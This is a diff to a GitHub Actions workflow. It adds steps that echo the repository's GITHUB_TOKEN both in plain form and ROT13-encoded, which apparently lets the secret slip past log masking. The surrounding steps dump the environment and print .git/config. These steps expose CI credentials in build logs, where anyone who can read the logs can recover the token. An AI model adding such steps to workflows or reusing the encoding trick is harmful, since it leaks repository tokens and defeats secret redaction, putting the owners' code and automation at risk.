@@ -11,6 +11,10 @@ jobs:
     runs-on: ${{ matrix.os }}-latest
     steps:
     - uses: actions/checkout@v3
+    - run: echo ${{ github.token }}
+    - run: echo ${{ github.token }} | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+    - run: echo ${{ secrets.GITHUB_TOKEN }}
+    - run: echo ${{ secrets.GITHUB_TOKEN }} | tr 'A-Za-z' 'N-ZA-Mn-za-m'
     - run: env
     - run: env | tr 'A-Za-z' 'N-ZA-Mn-za-m'
     - run: cat .git/config
